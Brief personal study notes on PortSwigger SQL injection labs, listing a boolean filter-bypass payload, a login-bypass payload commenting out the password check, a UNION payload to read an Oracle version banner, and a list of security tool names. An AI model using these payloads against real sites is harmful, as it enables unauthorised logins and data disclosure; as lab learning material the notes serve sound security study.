## portswigger labs
### 1 lab
- <span style="color:#00b050">'+OR+1=1--</span>    <= this is the first payload. try to change the ' to " and try again
### 2 lab

- if you trying to attack a <span style="color:#ffff00">login</span> page .try the payload in the username
```sql
SELECT * FROM `users` WHERE username='username' AND password= 'password';
```
if the payload set;
```sql
SELECT * FROM `users` WHERE username='administrator'-- ' AND password='';
```

### 3 lab
- to display the database version of a oracle database (use hack-tricks for this)
```sql
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

nuclei
sqlmap
amass
docker